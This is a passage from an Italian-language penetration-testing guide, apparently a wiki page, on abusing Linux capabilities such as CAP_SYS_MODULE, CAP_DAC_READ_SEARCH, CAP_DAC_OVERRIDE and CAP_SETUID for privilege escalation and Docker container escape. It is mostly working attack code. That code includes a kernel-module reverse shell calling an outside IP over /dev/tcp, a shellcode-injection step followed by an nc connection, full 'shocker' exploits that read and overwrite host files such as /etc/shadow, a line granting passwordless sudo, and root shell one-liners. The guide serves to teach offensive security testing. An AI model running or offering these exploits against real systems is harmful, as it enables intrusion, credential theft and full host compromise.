Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Elencare i **processi** in esecuzione nell'**host** `ps -eaf`

1. Ottenere l'**architettura** `uname -m`
2. Trovare uno **shellcode** per l'architettura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Trovare un **programma** per **iniettare** lo **shellcode** nella memoria di un processo ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modificare** lo **shellcode** all'interno del programma e **compilarlo** `gcc inject.c -o inject`
5. **Iniettarlo** e ottenere la tua **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** permette a un processo di **caricare e scaricare moduli del kernel (chiamate di sistema `init_module(2)`, `finit_module(2)` e `delete_module(2)`)**, offrendo un accesso diretto alle operazioni principali del kernel. Questa capacità presenta rischi di sicurezza critici, in quanto consente l'escalation dei privilegi e la compromissione totale del sistema, consentendo modifiche al kernel e bypassando tutti i meccanismi di sicurezza di Linux, inclusi i moduli di sicurezza di Linux e l'isolamento dei container.
**Ciò significa che è possibile inserire/rimuovere moduli del kernel nel/dal kernel della macchina host.**

**Esempio con un binario**

Nell'esempio seguente, il binario **`python`** ha questa capacità.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Di default, il comando **`modprobe`** controlla la lista delle dipendenze e i file di mappatura nella directory **`/lib/modules/$(uname -r)`**.\
Per sfruttare ciò, creiamo una falsa cartella **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Quindi **compila il modulo del kernel che puoi trovare 2 esempi di seguito e copialo** in questa cartella:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Infine, esegui il codice Python necessario per caricare questo modulo del kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Esempio 2 con binario**

Nell'esempio seguente, il binario **`kmod`** ha questa capacità.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Ciò significa che è possibile utilizzare il comando **`insmod`** per inserire un modulo del kernel. Segui l'esempio di seguito per ottenere una **shell inversa** sfruttando questo privilegio.

**Esempio con ambiente (Docker breakout)**

È possibile verificare le capacità abilitate all'interno del container Docker utilizzando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
All'interno dell'output precedente è possibile vedere che la capacità **SYS\_MODULE** è abilitata.

**Creare** il **modulo del kernel** che eseguirà una shell inversa e il **Makefile** per **compilarlo**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Lo spazio vuoto prima di ogni parola make nel Makefile **deve essere una tabulazione, non spazi**!
{% endhint %}

Esegui `make` per compilarlo.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Infine, avvia `nc` all'interno di una shell e **carica il modulo** da un'altra shell e catturerai la shell nel processo nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing SYS\_MODULE Capability" da** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Un altro esempio di questa tecnica può essere trovato in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permette a un processo di **bypassare le autorizzazioni per la lettura dei file e per la lettura ed esecuzione delle directory**. Il suo utilizzo principale è per la ricerca o la lettura dei file. Tuttavia, consente anche a un processo di utilizzare la funzione `open_by_handle_at(2)`, che può accedere a qualsiasi file, incluso quelli al di fuori dello spazio dei nomi di montaggio del processo. L'handle utilizzato in `open_by_handle_at(2)` dovrebbe essere un identificatore non trasparente ottenuto tramite `name_to_handle_at(2)`, ma può includere informazioni sensibili come i numeri di inode che sono vulnerabili a manomissioni. Il potenziale di sfruttamento di questa capacità, in particolare nel contesto dei container Docker, è stato dimostrato da Sebastian Krahmer con l'exploit shocker, come analizzato [qui](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Ciò significa che è possibile bypassare i controlli di autorizzazione per la lettura dei file e i controlli di autorizzazione per la lettura/esecuzione delle directory.**

**Esempio con un binario**

Il binario sarà in grado di leggere qualsiasi file. Quindi, se un file come tar ha questa capacità, sarà in grado di leggere il file shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Esempio con binary2**

In questo caso supponiamo che il binario **`python`** abbia questa capacità. Per elencare i file di root è possibile eseguire il seguente comando:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
E per leggere un file potresti fare:
```python
print(open("/etc/shadow", "r").read())
```
**Esempio in ambiente (Docker breakout)**

Puoi verificare le capacità abilitate all'interno del container Docker utilizzando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
All'interno dell'output precedente è possibile vedere che la capacità **DAC\_READ\_SEARCH** è abilitata. Di conseguenza, il contenitore può **eseguire il debug dei processi**.

È possibile apprendere come funziona lo sfruttamento seguendo il link [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ma in sintesi **CAP\_DAC\_READ\_SEARCH** non solo ci consente di attraversare il file system senza controlli di autorizzazione, ma rimuove esplicitamente anche qualsiasi controllo su _**open\_by\_handle\_at(2)**_ e **potrebbe consentire al nostro processo di accedere a file sensibili aperti da altri processi**.

L'exploit originale che sfrutta queste autorizzazioni per leggere file dall'host può essere trovato qui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), di seguito è riportata una **versione modificata che consente di indicare il file da leggere come primo argomento e di salvarlo in un file**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
L'exploit deve trovare un puntatore a qualcosa montato sull'host. L'exploit originale utilizzava il file /.dockerinit e questa versione modificata utilizza /etc/hostname. Se l'exploit non funziona, potrebbe essere necessario impostare un file diverso. Per trovare un file montato sull'host, esegui semplicemente il comando mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing DAC\_READ\_SEARCH Capability" di** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) è l'evento sulla sicurezza informatica più rilevante in **Spagna** e uno dei più importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso è un punto di incontro vivace per i professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Questo significa che puoi aggirare i controlli di autorizzazione in scrittura su qualsiasi file, quindi puoi scrivere qualsiasi file.**

Ci sono molti file che puoi **sovrascrivere per ottenere privilegi elevati,** [**puoi trovare idee qui**](payloads-to-execute.md#sovrascrivere-un-file-per-ottenere-privilegi-elevati).

**Esempio con un binario**

In questo esempio, vim ha questa capacità, quindi puoi modificare qualsiasi file come _passwd_, _sudoers_ o _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Esempio con il binario 2**

In questo esempio il binario **`python`** avrà questa capacità. Potresti utilizzare python per sovrascrivere qualsiasi file:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Esempio con ambiente + CAP_DAC_READ_SEARCH (Docker breakout)**

Puoi verificare le capacità abilitate all'interno del container Docker utilizzando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Prima di tutto, leggi la sezione precedente che [**sfrutta la capacità DAC\_READ\_SEARCH per leggere file arbitrari**](linux-capabilities.md#cap\_dac\_read\_search) dell'host e **compila** l'exploit.\
Successivamente, **compila la seguente versione dell'exploit shocker** che ti permetterà di **scrivere file arbitrari** nel filesystem dell'host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Per scappare dal container Docker, è possibile **scaricare** i file `/etc/shadow` e `/etc/passwd` dall'host, **aggiungere** ad essi un **nuovo utente** e utilizzare **`shocker_write`** per sovrascriverli. Successivamente, è possibile **accedere** tramite **ssh**.

**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing DAC\_OVERRIDE Capability" da** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Ciò significa che è possibile cambiare la proprietà di qualsiasi file.**

**Esempio con un binario**

Supponiamo che il binario **`python`** abbia questa capacità, è possibile **cambiare** il **proprietario** del file **shadow**, **cambiare la password di root** ed elevare i privilegi:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Oppure con il binario **`ruby`** che ha questa capacità:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Questo significa che è possibile modificare i permessi di qualsiasi file.**

**Esempio con un binario**

Se Python ha questa capacità, è possibile modificare i permessi del file shadow, **cambiare la password di root** ed elevare i privilegi:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Questo significa che è possibile impostare l'ID utente effettivo del processo creato.**

**Esempio con un binario**

Se Python ha questa **abilità**, è possibile sfruttarla facilmente per ottenere privilegi di root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Un altro modo:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Questo significa che è possibile impostare l'ID del gruppo effettivo del processo creato.**

Ci sono molti file che è possibile sovrascrivere per ottenere privilegi elevati, [**puoi trovare idee qui**](payloads-to-execute.md#sovrascrivere-un-file-per-ottenere-privilegi-elevati).

**Esempio con un binario**

In questo caso, dovresti cercare file interessanti che un gruppo può leggere perché puoi impersonare qualsiasi gruppo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Una volta che hai trovato un file che puoi sfruttare (tramite lettura o scrittura) per ottenere privilegi elevati, puoi **ottenere una shell impersonando il gruppo interessante** con:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In questo caso è stata impersonata il gruppo shadow in modo da poter leggere il file `/etc/shadow`:
```bash
cat /etc/shadow
```
Se **docker** è installato, potresti **impersonare** il **gruppo docker** e abusarne per comunicare con il [**socket docker** e ottenere privilegi elevati](./#writable-docker-socket).

## CAP\_SETFCAP

**Questo significa che è possibile impostare le capacità su file e processi**

**Esempio con un binario**

Se Python ha questa **capacità**, puoi facilmente abusarne per ottenere privilegi elevati come root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Nota che se imposti una nuova capacità al binario con CAP\_SETFCAP, perderai questa capacità.
{% endhint %}

Una volta ottenuta la [capacità SETUID](linux-capabilities.md#cap\_setuid), puoi passare alla sua sezione per vedere come ottenere privilegi elevati.

**Esempio con ambiente (Docker breakout)**

Per impostazione predefinita, la capacità **CAP\_SETFCAP viene data al processo all'interno del container in Docker**. Puoi verificarlo facendo qualcosa come:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Questa capacità consente di **assegnare qualsiasi altra capacità ai binari**, quindi potremmo pensare di **evadere** dal contenitore **abusando di uno dei precedenti exploit di capacità** menzionati in questa pagina.\
Tuttavia, se si prova ad assegnare ad esempio le capacità CAP\_SYS\_ADMIN e CAP\_SYS\_PTRACE al binario gdb, si scoprirà che è possibile assegnarle, ma il **binario non sarà in grado di eseguire dopo questo**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Dalla documentazione](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Questo è un **superset limitante per le capacità effettive** che il thread può assumere. È anche un superset limitante per le capacità che possono essere aggiunte all'insieme ereditabile da un thread che **non ha la capacità CAP\_SETPCAP** nel suo insieme effettivo._\
Sembra che le capacità consentite limitino quelle che possono essere utilizzate.\
Tuttavia, Docker concede anche il **CAP\_SETPCAP** per impostazione predefinita, quindi potresti essere in grado di **impostare nuove capacità all'interno dell'insieme ereditabile**.\
Tuttavia, nella documentazione di questa capacità: _CAP\_SETPCAP : \[…] **aggiunge qualsiasi capacità dall'insieme di bounding del thread chiamante** al suo insieme ereditabile_.\
Sembra che possiamo solo aggiungere all'insieme ereditabile le capacità dall'insieme di bounding. Ciò significa che **non possiamo inserire nuove capacità come CAP\_SYS\_ADMIN o CAP\_SYS\_PTRACE nell'insieme ereditabile per l'escalation dei privilegi**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fornisce una serie di operazioni sensibili, tra cui l'accesso a `/dev/mem`, `/dev/kmem` o `/proc/kcore`, la modifica di `mmap_min_addr`, l'accesso alle chiamate di sistema `ioperm(2)` e `iopl(2)`, e vari comandi del disco. L'`ioctl(2)` `FIBMAP` è anche abilitato tramite questa capacità, il che ha causato problemi in passato ([qui](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)). Come indicato nella pagina man, questo consente anche al detentore di **eseguire in modo descrittivo una serie di operazioni specifiche del dispositivo su altri dispositivi**.

Questo può essere utile per **l'escalation dei privilegi** e **l'evasione di Docker**.

## CAP\_KILL

**Ciò significa che è possibile terminare qualsiasi processo.**

**Esempio con un binario**

Supponiamo che il binario **`python`** abbia questa capacità. Se potessi **modificare anche qualche configurazione di servizio o socket** (o qualsiasi file di configurazione relativo a un servizio), potresti inserire un backdoor e quindi terminare il processo relativo a quel servizio e attendere l'esecuzione del nuovo file di configurazione con il tuo backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc con kill**

Se hai le capacità di kill e c'è un programma **node in esecuzione come root** (o come un utente diverso), probabilmente puoi **inviargli** il **segnale SIGUSR1** e farlo **aprire il debugger di node** a cui puoi connetterti.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) è l'evento di sicurezza informatica più rilevante in **Spagna** e uno dei più importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso è un punto di incontro bollente per professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Ciò significa che è possibile ascoltare su qualsiasi porta (anche su quelle privilegiate).** Non è possibile scalare i privilegi direttamente con questa capacità.

**Esempio con binario**

Se **`python`** ha questa capacità, sarà in grado di ascoltare su qualsiasi porta e persino connettersi da essa a qualsiasi altra porta (alcuni servizi richiedono connessioni da porte privilegiate specifiche)

{% tabs %}
{% tab title="Ascolto" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Connetti" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

La capacità **CAP\_NET\_RAW** permette ai processi di **creare socket RAW e PACKET**, consentendo loro di generare e inviare pacchetti di rete arbitrari. Ciò può comportare rischi per la sicurezza in ambienti containerizzati, come il falsificare pacchetti, l'iniettare traffico e il bypassare i controlli di accesso alla rete. Attori malevoli potrebbero sfruttare ciò per interferire con il routing dei container o compromettere la sicurezza della rete dell'host, specialmente senza adeguate protezioni del firewall. Inoltre, **CAP_NET_RAW** è fondamentale per i container privilegiati per supportare operazioni come il ping tramite richieste ICMP RAW.

**Ciò significa che è possibile intercettare il traffico.** Non è possibile scalare i privilegi direttamente con questa capacità.

**Esempio con un binario**

Se il binario **`tcpdump`** ha questa capacità, sarà possibile utilizzarlo per catturare informazioni di rete.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Nota che se l'**ambiente** fornisce questa capacità, è possibile utilizzare anche **`tcpdump`** per intercettare il traffico.

**Esempio con il binario 2**

